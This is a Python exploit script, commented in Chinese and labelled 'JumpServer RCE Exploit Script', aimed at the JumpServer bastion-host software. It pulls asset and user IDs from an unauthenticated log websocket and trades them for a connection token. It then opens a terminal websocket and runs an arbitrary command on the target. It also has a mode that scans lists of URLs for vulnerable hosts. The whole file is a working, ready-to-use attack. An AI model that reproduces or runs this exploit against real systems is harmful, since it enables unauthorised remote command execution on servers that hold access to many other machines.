#!/usr/bin/python3
# -*- coding: utf-8 -*-
import asyncio
import websockets
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import json
import re
import sys
import argparse
import ssl

path = "/api/v1/authentication/connection-token/?user-only=None"
 
# 向服务器端发送认证后的消息
async def send_msg(websocket,_text):
    if _text == "exit":
        #print(f'you have enter "exit", goodbye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
    #print(f"{recv_text}")
 
# 客户端主逻辑
async def main_logic(url,cmd):
    print("[*] 连接WebSocket服务器......")
    target = "wss://"+url.replace("https://",'')+"/ws/ops/tasks/log/"
    
    async with websockets.connect(target,ssl=ssl._create_unverified_context()) as websocket:
        # 获取三个参数值
        await send_msg(websocket,json.dumps({"task":"/opt/jumpserver/logs/gunicorn"}))
        for i in range(100):
            recv_text = await websocket.recv()
            three_pram=re.findall(r"asset_id=[a-z0-9\-]*[a-z\_=0-9\-&]*",recv_text)
            
            if three_pram:
                break
        print(three_pram)
        for i in range(len(three_pram)):
            three_pram[i]={"asset":re.findall(r"asset_id=[a-z0-9\-]*",three_pram[i])[0][9:],"system_user":re.findall(r"system_user_id=[a-z0-9\-]*",three_pram[i])[0][15:],"user":re.findall(r"&user_id=[a-z0-9\-]*",three_pram[i])[0][9:]}
        print("[+] 获取到三个参数值：",three_pram)
        #取列表第一个元素
        res = requests.post(url + path, data=three_pram[0], verify=False)
        token = res.json()["token"]
        print("[+] 获得token:",token)
        await send_msg(websocket,"exit")
    target2 = "wss://" + url.replace("https://", '') + "/koko/ws/token/?target_id=" + token
    
    async with websockets.connect(target2,ssl=ssl._create_unverified_context()) as websocket2:
        recv_text = await websocket2.recv()
        # 获取id
        resws=json.loads(recv_text)
        
        id = resws['id']
        print("[+] 获得id: "+id)
        print("[*] 初始化终端......")
        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
        await send_msg(websocket2,inittext)
        recv_text = await websocket2.recv()
        # 执行命令
        print("[+] 执行命令: "+cmd)
        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
        await send_msg(websocket2, cmdtext)
        print("[+] 执行结果：")
        # 接收10次数据
        for i in range(10):
            recv_text = await websocket2.recv()
            #print(i,recv_text)
            result=json.loads(recv_text)
            print(result["data"])
        await send_msg(websocket2,"exit")
 
# 漏洞检测
async def check_vuln(url):
    target = "wss://"+url.replace("https://",'')+"/ws/ops/tasks/log/"
    print("[*] Check：",url)
    try:
        async with websockets.connect(target,ssl=ssl._create_unverified_context()) as websocket:
        
        # 获取三个参数值
            await send_msg(websocket,json.dumps({"task":"/opt/jumpserver/logs/gunicorn"}))
            for i in range(100):
                recv_text = await websocket.recv()
                three_pram=re.findall(r"asset_id=[a-z0-9\-]*[a-z\_=0-9\-&]*",recv_text)
                if three_pram:
                    break
            await send_msg(websocket,"exit")
            print("[Vulnerable]",url)
    except:
        pass
 
parser=argparse.ArgumentParser(description="JumpServer RCE Exploit Script!    --By Infiltrator",epilog="Example: python3 JumpServer_Exp.py -u http://192.168.1.73:8080 -e whoami")
group = parser.add_mutually_exclusive_group(required=True)
group2 = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u','--url',help="目标url地址")
group.add_argument('-f','--file',type=argparse.FileType('r',encoding='utf8'),help="目标url文件")
group2.add_argument('-c','--check',action='store_true',help="只检查不执行命令")
group2.add_argument('-e','--execute',help="需要执行的命令")
args = parser.parse_args()
 
if args.url and args.check:
    asyncio.get_event_loop().run_until_complete(check_vuln(args.url))
if args.file and args.check:
    fl=args.file.read().split('\n')
    for i in fl:
        asyncio.get_event_loop().run_until_complete(check_vuln(i))
if args.url and args.execute:
    asyncio.get_event_loop().run_until_complete(main_logic(args.url,args.execute))
if args.file and args.execute:
    print("[!] 该功能暂未实现！")
